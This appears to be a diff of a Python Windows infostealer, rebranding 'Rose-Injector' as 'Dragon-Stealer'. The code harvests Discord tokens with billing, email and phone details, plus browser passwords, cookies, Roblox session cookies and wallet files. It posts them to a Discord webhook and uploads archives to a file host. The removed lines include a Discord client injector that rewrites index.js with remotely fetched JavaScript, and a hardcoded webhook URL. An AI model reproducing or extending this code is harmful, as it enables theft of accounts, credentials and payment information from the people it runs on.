@@ -9,7 +9,6 @@ import platform
 import socket
 import getpass
 import platform
-import psutil
 from base64 import b64decode
 from json import loads as json_loads, load
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
@@ -19,21 +18,11 @@ from urllib.request import Request, urlopen
 from json import loads, dumps
 from zipfile import ZipFile
 
+from Crypto.Cipher import AES
 
-if platform.system() == "Windows":
-    # If running on Windows, do nothing and continue with the program
-    pass
-else:
-    # If not running on Windows, exit the program
-    quit()
-
-hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
-hook = "WEBHOOK_HERE"
-debug_mode = False
-
-if hwid == "5A25762A-89E6-8A18-A523-00D861C74757":
-    debug_mode = True
-    hook = "https://canary.discord.com/api/webhooks/1078237508833390683/4lQklEhIbk-T8H7Bfw6mPWipA3onoRfHu-o9BW7yHQvxyLtKjm4gHq-qq8DTrfDO19aU"
+import discordc
+from configuration import Config 
+cc = Config()
 
 try:
     import requests
@@ -42,35 +31,40 @@ try:
 except ModuleNotFoundError:
     os.system("pip install requests")
     os.system("pip install pillow")
+    
+    requirements = [["requests", "requests"], ["Crypto.Cipher", "pycryptodome"], ["PIL", "pillow"], ["discord", "discord"], ["wmi", "wmi"], ["psutil", "psutil"]]
+    for modl in requirements:
+        try:
+            __import__(modl[0])
+        except:
+            subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
+            time.sleep(3)
+            
+if platform.system() != "Windows":
+    quit()
 
-DETECTED = False
-
-
-def getip():
+    
+def get_ip():
     ip = "None"
     ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
     return ip
 
-
-requirements = [["requests", "requests"], ["Crypto.Cipher", "pycryptodome"], ["PIL", "pillow"], ["discord", "discord"], ["wmi", "wmi"], ["psutil", "psutil"]]
-for modl in requirements:
-    try:
-        __import__(modl[0])
-    except:
-        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
-        time.sleep(3)
-
-import requests
-from Crypto.Cipher import AES
+hook = cc.get_webhook()
+debug_mode = cc.get_debug_mode()
+footer = cc.get_footer()
+avatar = cc.get_avatar()
+color = cc.get_color()
+print(hook)
 
 local = os.getenv("LOCALAPPDATA")
 roaming = os.getenv("APPDATA")
 temp = os.getenv("TEMP")
 Threadlist = []
-eb_footer = "Rose-Injector modified by [Gum](https://discord.com/users/1075072806892621874/), [pierro](https://discord.com/users/951401018065846372/) and [Websi](https://discord.com/users/716729476876206160/) | [GitHub](https://github.com/Gumbobrot/) | [Rose-Injector](https://github.com/Gum-s/Rose-Injector/)"
-eb_color = 16711680
-wh_avatar = "https://i.imgur.com/EZFAJXh.png"
-wh_name = "Rose-Injector"
+DETECTED = False
+
+
+payload = {"content": "<:titjob:1083098548977016932> **AYOOO GRABBED SOME DUMMY** ||@everyone||", "username": "Dragon-Stealer", "avatar_url": avatar}
+response = requests.post(hook, json=payload)
 
 class DATA_BLOB(Structure):
     _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]
@@ -124,21 +118,18 @@ def LoadRequests(methode, url, data="", files="", headers=""):
 
 
 def LoadUrlib(hook, data="", files="", headers=""):
-    for i in range(8):
-        if headers != "":
-            r = urlopen(Request(hook, data=data, headers=headers))
-            return r
-        else:
-            r = urlopen(Request(hook, data=data))
-            return r
-
-
-payload = {"content": "<:titjob:1083098548977016932> **AYOOO GRABBED SOME DUMMY** ||@everyone||", "username": wh_name, "avatar_url": wh_avatar}
-response = requests.post(hook, json=payload)
+    if headers != "":
+        r = urlopen(Request(hook, data=data, headers=headers))
+        print(r)
+        return r
+    else:
+        r = urlopen(Request(hook, data=data))
+        print(r)
+        return r
 
 
 def globalInfo():
-    ip = getip()
+    ip = get_ip()
     username = os.getenv("USERNAME")
     ipdatanojson = (urlopen(Request(
         f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace(
@@ -165,338 +156,6 @@ def Trust(Cookies):
     else:
         DETECTED = False
         return DETECTED
-    
-class Discord(): #Updating soon
-    def __init__(self):
-        if debug_mode:
-            print("Discord Init")
-        
-    
-
-
-    def GetUHQFriends(self, token):
-        badgeList = [
-            {
-                "Name": "Early_Verified_Bot_Developer",
-                "Value": 131072,
-                "Emoji": "<:developer:874750808472825986> ",
-            },
-            {
-                "Name": "Bug_Hunter_Level_2",
-                "Value": 16384,
-                "Emoji": "<:bughunter_2:874750808430874664> ",
-            },
-            {
-                "Name": "Early_Supporter",
-                "Value": 512,
-                "Emoji": "<:early_supporter:874750808414113823> ",
-            },
-            {
-                "Name": "House_Balance",
-                "Value": 256,
-                "Emoji": "<:balance:874750808267292683> ",
-            },
-            {
-                "Name": "House_Brilliance",
-                "Value": 128,
-                "Emoji": "<:brilliance:874750808338608199> ",
-            },
-            {
-                "Name": "House_Bravery",
-                "Value": 64,
-                "Emoji": "<:bravery:874750808388952075> ",
-            },
-            {
-                "Name": "Bug_Hunter_Level_1",
-                "Value": 8,
-                "Emoji": "<:bughunter_1:874750808426692658> ",
-            },
-            {
-                "Name": "HypeSquad_Events",
-                "Value": 4,
-                "Emoji": "<:hypesquad_events:874750808594477056> ",
-            },
-            {
-                "Name": "Partnered_Server_Owner",
-                "Value": 2,
-                "Emoji": "<:partner:874750808678354964> ",
-            },
-            {
-                "Name": "Discord_Employee",
-                "Value": 1,
-                "Emoji": "<:staff:874750808728666152> ",
-            },
-        ]
-        headers = {
-            "Authorization":
-            token,
-            "Content-Type":
-            "application/json",
-            "User-Agent":
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
-        }
-        try:
-            friendlist = loads(
-                urlopen(
-                    Request(
-                        "https://discord.com/api/v6/users/@me/relationships",
-                        headers=headers,
-                    )).read().decode())
-        except:
-            return False
-
-        uhqlist = ""
-        for friend in friendlist:
-            OwnedBadges = ""
-            flags = friend["user"]["public_flags"]
-            for badge in badgeList:
-                if flags // badge["Value"] != 0 and friend["type"] == 1:
-                    if not "House" in badge["Name"]:
-                        OwnedBadges += badge["Emoji"]
-                    flags = flags % badge["Value"]
-            if OwnedBadges != "":
-                uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
-        return uhqlist
-
-
-    def GetBilling(self, token):
-        headers = {
-            "Authorization":
-            token,
-            "Content-Type":
-            "application/json",
-            "User-Agent":
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
-        }
-        try:
-            billingjson = loads(
-                urlopen(
-                    Request(
-                        "https://discord.com/api/users/@me/billing/payment-sources",
-                        headers=headers,
-                    )).read().decode())
-        except:
-            return False
-
-        if billingjson == []:
-            return "?"
-
-        billing = ""
-        for methode in billingjson:
-            if methode["invalid"] == False:
-                if methode["type"] == 1:
-                    billing += ":credit_card:"
-                elif methode["type"] == 2:
-                    billing += ":parking: "
-
-        return billing
-
-
-    def GetBadge(self, flags):
-        if flags == 0:
-            return ""
-
-        OwnedBadges = ""
-        badgeList = [
-            {
-                "Name": "Early_Verified_Bot_Developer",
-                "Value": 131072,
-                "Emoji": "<:developer:874750808472825986> ",
-            },
-            {
-                "Name": "Bug_Hunter_Level_2",
-                "Value": 16384,
-                "Emoji": "<:bughunter_2:874750808430874664> ",
-            },
-            {
-                "Name": "Early_Supporter",
-                "Value": 512,
-                "Emoji": "<:early_supporter:874750808414113823> ",
-            },
-            {
-                "Name": "House_Balance",
-                "Value": 256,
-                "Emoji": "<:balance:874750808267292683> ",
-            },
-            {
-                "Name": "House_Brilliance",
-                "Value": 128,
-                "Emoji": "<:brilliance:874750808338608199> ",
-            },
-            {
-                "Name": "House_Bravery",
-                "Value": 64,
-                "Emoji": "<:bravery:874750808388952075> ",
-            },
-            {
-                "Name": "Bug_Hunter_Level_1",
-                "Value": 8,
-                "Emoji": "<:bughunter_1:874750808426692658> ",
-            },
-            {
-                "Name": "HypeSquad_Events",
-                "Value": 4,
-                "Emoji": "<:hypesquad_events:874750808594477056> ",
-            },
-            {
-                "Name": "Partnered_Server_Owner",
-                "Value": 2,
-                "Emoji": "<:partner:874750808678354964> ",
-            },
-            {
-                "Name": "Discord_Employee",
-                "Value": 1,
-                "Emoji": "<:staff:874750808728666152> ",
-            },
-        ]
-        for badge in badgeList:
-            if flags // badge["Value"] != 0:
-                OwnedBadges += badge["Emoji"]
-                flags = flags % badge["Value"]
-
-        return OwnedBadges
-
-
-    def GetTokenInfo(self, token):
-        headers = {
-            "Authorization":
-            token,
-            "Content-Type":
-            "application/json",
-            "User-Agent":
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
-        }
-
-        userjson = loads(
-            urlopen(
-                Request("https://discordapp.com/api/v6/users/@me",
-                        headers=headers)).read().decode())
-        username = userjson["username"]
-        hashtag = userjson["discriminator"]
-        email = userjson["email"]
-        idd = userjson["id"]
-        pfp = userjson["avatar"]
-        flags = userjson["public_flags"]
-        nitro = ""
-        phone = "-"
-
-        if "premium_type" in userjson:
-            nitrot = userjson["premium_type"]
-            if nitrot == 1:
-                nitro = "<:classic:896119171019067423> "
-            elif nitrot == 2:
-                nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
-        if "phone" in userjson:
-            phone = f'```{userjson["phone"]}```'
-
-        return username, hashtag, email, idd, pfp, flags, nitro, phone
-
-
-    def checkToken(self, token):
-        headers = {
-            "Authorization":
-            token,
-            "Content-Type":
-            "application/json",
-            "User-Agent":
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
-        }
-        try:
-            urlopen(
-                Request("https://discordapp.com/api/v6/users/@me",
-                        headers=headers))
-            return True
-        except:
-            return False
-
-
-    def uploadToken(self, token):
-        global hook
-        headers = {
-            "Content-Type":
-            "application/json",
-            "User-Agent":
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
-        }
-        username, hashtag, email, idd, pfp, flags, nitro, phone = self.GetTokenInfo(token)
-
-        if pfp == None:
-            pfp = "https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png"
-        else:
-            pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
-
-        billing = self.GetBilling(token)
-        badge = self.GetBadge(flags)
-        friends = self.GetUHQFriends(token)
-        if friends == "":
-            friends = "No Rare Friends"
-        if not billing:
-            badge, phone, billing = "🔒", "🔒", "🔒"
-        if nitro == "" and badge == "":
-            nitro = "?"
-
-        data = {
-            "content":
-            "",
-            "embeds": [{
-                "color":
-                eb_color,
-                "fields": [
-                    {
-                        "name": ":tickets:   -   Token:",
-                        "value": f"```{token}```",
-                    },
-                    {
-                        "name": ":earth_asia:   -   Email:",
-                        "value": f"```{email}```",
-                        "inline": True,
-                    },
-                    {
-                        "name": ":telephone_receiver:   -   Phone:",
-                        "value": f"{phone}",
-                        "inline": True,
-                    },
-                    {
-                        "name": ":globe_with_meridians:   -   IP:",
-                        "value": f"```{getip()}```",
-                        "inline": True,
-                    },
-                    {
-                        "name": ":beginner:   -   Badges:",
-                        "value": f"{nitro}{badge}",
-                        "inline": True,
-                    },
-                    {
-                        "name": ":credit_card:   -   Billing:",
-                        "value": f"{billing}",
-                        "inline": True,
-                    },
-                    {
-                        "name": ":office:   -   Friends:",
-                        "value": f"{friends}",
-                        "inline": False,
-                    },
-                ],
-                "author": {
-                    "name": f"{username}#{hashtag} ({idd})",
-                    "icon_url": f"{pfp}",
-                },
-                "footer": {
-                    "text": eb_footer,
-                    "icon_url": "",
-                },
-                "thumbnail": {
-                    "url": f"{pfp}"
-                },
-            }],
-            "avatar_url":
-            wh_avatar,
-            "username":
-            wh_name,
-            "attachments": [],
-        }
-        # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
-        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
 
 
 def Reformat(listt):
@@ -512,11 +171,10 @@ def Reformat(listt):
 
 def upload(name, link):
     headers = {
-        "Content-Type":
-        "application/json",
-        "User-Agent":
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
     }
+    
 
     if name == "wpcook":
         rb = "  -  ".join(da for da in cookiWords)
@@ -527,21 +185,22 @@ def upload(name, link):
             "content":
             "",
             "embeds": [{
-                "title": f"{wh_name}  -  Cookie Grabber",
+                "title": "Dragon  -  Cookie Grabber",
                 "description":
-                f"**Found**:\n{rb}\n\n**Data:**\n**{CookiCount}** Cookies Found\n[RoseCookies.txt]({link})",
-                "color": eb_color,
+                f"**Found**:\n{rb}\n\n**Data:**\n**{CookiCount}** Cookies Found\n[DragonCookies.txt]({link})",
+                "color": color,
                 "footer": {
-                    "text": eb_footer,
+                    "text": footer,
                     "icon_url": "",
                 },
             }],
             "username":
-            wh_name,
+            "Dragon-Stealer",
             "avatar_url":
-            wh_avatar,
+            avatar,
             "attachments": [],
         }
+        #urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
         return
 
@@ -555,33 +214,24 @@ def upload(name, link):
             "content":
             "",
             "embeds": [{
-                "title": f"{wh_name}  -  Password Grabber",
+                "title": "Dragon  -  Password Grabber",
                 "description":
-                f"**Found**:\n{ra}\n\n**Data:**\n**{PasswCount}** Passwords Found\n[RosePasswords.txt]({link})",
-                "color": eb_color,
+                f"**Found**:\n{ra}\n\n**Data:**\n**{PasswCount}** Passwords Found\n[DragonPasswords.txt]({link})",
+                "color": color,
                 "footer": {
-                    "text": eb_footer,
+                    "text": footer,
                     "icon_url": "",
                 },
             }],
             "username":
-            wh_name,
+            "Dragon-Stealer",
             "avatar_url":
-            wh_avatar,
+            avatar,
             "attachments": [],
         }
+        #urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
         return
-
-
-# def upload(name, tk=''):
-#     headers = {
-#         "Content-Type": "application/json",
-#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-#     }
-
-#     # r = requests.post(hook, files=files)
-#     LoadRequests("POST", hook, files=files)
 
 
 def writeforfile(data, name):
@@ -594,7 +244,7 @@ def writeforfile(data, name):
 
 
 Tokens = ""
-dclass = Discord()
+dclass = discordc.DiscordX()
 
 def GetTokens(path, arg):
     if not os.path.exists(path):
@@ -616,9 +266,8 @@ def GetTokens(path, arg):
                         global Tokens
                         if dclass.checkToken(token):
                             if not token in Tokens:
-                                # print(token)
                                 Tokens += token
-                                dclass.uploadToken(token, path)
+                                dclass.uploadToken(token)
 
 
 Passw = []
@@ -722,6 +371,7 @@ def GetCookies(path, arg):
 
 
 def RobloxCookie(path, arg):
+    return
     global roblox_cookie
     pathC = path + arg + "\Cookies"
     tempfold = (
@@ -731,9 +381,9 @@ def RobloxCookie(path, arg):
     shutil.copy2(pathC, tempfold)
     os.remove(tempfold)
     roblox_cookie = ""
-    with open(os.path.join(pathC, "Cookies", "RoseRobloxCookies.txt"), 'w', encoding="utf-8") as f:
-        f.write(f"{eb_footer}\n\n")
-        with open(os.path.join(pathC, "Cookies", "RoseCookies.txt"), 'r', encoding="utf-8") as f2:
+    with open(os.path.join(pathC, "Cookies", "DragonRobloxCookies.txt"), 'w', encoding="utf-8") as f:
+        f.write(f"{footer}\n\n")
+        with open(os.path.join(pathC, "Cookies", "DragonCookies.txt"), 'r', encoding="utf-8") as f2:
             try:
                 for line in f2:
                     if ".ROBLOSECURITY" in line:
@@ -753,8 +403,8 @@ def UploadRobloxCookie(hook):
         "",
         "embeds": [{
             "color":
-            eb_color,
-            "title": f"{wh_name}  -  Roblox Cookie Grabber",
+            color,
+            "title": "Dragon  -  Roblox Cookie Grabber",
             "fields": [
                 {
                     "name": "<:roblox_icon:1041819334969937931> Name:",
@@ -772,18 +422,18 @@ def UploadRobloxCookie(hook):
                 },
             ],
             "footer": {
-                "text": eb_footer,
+                "text": footer,
                 "icon_url": "",
             },
         }],
         "avatar_url":
-        wh_avatar,
+        avatar,
         "username":
-        wh_name,
+        "Dragon-Stealer",
         "attachments": [],
     }
-    # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
-    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
+    urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
+    #LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
 
 
 def GetDiscord(path, arg):
@@ -861,7 +511,7 @@ def GatherZips(paths1, paths2, paths3):
         "Content-Type":
         "application/json",
         "User-Agent":
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
     }
 
     # Has a problem.
@@ -870,72 +520,20 @@ def GatherZips(paths1, paths2, paths3):
         "content":
         "",
         "embeds": [{
-            "title": f"{wh_name}  -  Zips",
+            "title": "Dragon  -  Zips",
             "description": f"{wal}\n{ga}\n{ot}",
-            "color": eb_color,
+            "color": color,
             "footer": {
-                "text": eb_footer,
+                "text": footer,
                 "icon_url": "",
             },
         }],
         "username":
-        wh_name,
+        "Dragon-Stealer",
         "avatar_url":
-        wh_avatar,
+        avatar,
         "attachments": [],
     }
-
-
-class Injection:
-    def __init__(self, hook: str) -> None:
-        self.appdata = os.getenv('LOCALAPPDATA')
-        self.discord_dirs = [
-            self.appdata + '\\Discord',
-            self.appdata + '\\DiscordCanary',
-            self.appdata + '\\DiscordPTB',
-            self.appdata + '\\DiscordDevelopment'
-        ]
-        self.code = requests.get('https://github.com/DamagingRose/Rose-Injector/blob/main/injection/injection.js').text
-
-        for proc in psutil.process_iter():
-            if 'discord' in proc.name().lower():
-                proc.kill()
-
-        for dir in self.discord_dirs:
-            if not os.path.exists(dir):
-                continue
-
-            if self.get_core(dir) is not None:
-                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
-                    f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', hook))
-                    self.start_discord(dir)
-
-    def get_core(self, dir: str) -> tuple:
-        for file in os.listdir(dir):
-            if re.search(r'app-+?', file):
-                modules = dir + '\\' + file + '\\modules'
-                if not os.path.exists(modules):
-                    continue
-                for file in os.listdir(modules):
-                    if re.search(r'discord_desktop_core-+?', file):
-                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
-                        if not os.path.exists(core + '\\index.js'):
-                            continue
-                        return core, file
-
-    def start_discord(self, dir: str) -> None:
-        update = dir + '\\Update.exe'
-        executable = dir.split('\\')[-1] + '.exe'
-
-        for file in os.listdir(dir):
-            if re.search(r'app-+?', file):
-                app = dir + '\\' + file
-                if os.path.exists(app + '\\' + 'modules'):
-                    for file in os.listdir(app):
-                        if file == executable:
-                            executable = app + '\\' + executable
-                            subprocess.call([update, '--processStart', executable],
-                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 
 def ZipTelegram(path, arg, procc):
@@ -1002,14 +600,7 @@ def ZipThings(path, arg, procc):
     # lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
     lnik = "https://google.com"
     os.remove(f"{pathC}/{name}.zip")
-
-    if "Wallet" in arg or "eogaeaoehlef" in arg:
-        WalletsZip.append([name, lnik])
-    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
-        GamingZip.append([name, lnik])
-    else:
-        OtherZip.append([name, lnik])
-
+    # SEND TO WEBHOOK
 
 def GatherAll():
     "Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >"
@@ -1158,14 +749,18 @@ def GatherAll():
 
 
 def uploadToAnonfiles(path):
-    return
     try:
-        return requests.post(
+        data = {
+            "password": "HENRIO"
+        }
+        rr = requests.post(
             f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
             files={
                 "file": open(path, "rb")
             },
+            data = data
         ).json()["data"]["downloadPage"]
+        return rr
     except:
         return False
 
@@ -1320,9 +915,9 @@ OtherZip = []
 
 GatherAll()
 #RobloxCookie()
-Injection(hook)
+#Injection(hook)
 DETECTED = Trust(Cookies)
-# DETECTED = False
+DETECTED = False
 if not DETECTED:
     wikith = Kiwi()
 
@@ -1358,15 +953,11 @@ name = (str(subprocess.check_output("wmic csproduct get name"),
 
 embed = {
     "title":
-    f"{wh_name}  -  Extras",
+    "Dragon  -  Extras",
     "description":
     "Extra Information.",
     "color":
-    eb_color,
-    "avatar":
-    wh_avatar,
-    "username":
-    wh_name,
+    color,
     "fields": [
         {
             "name": "User",
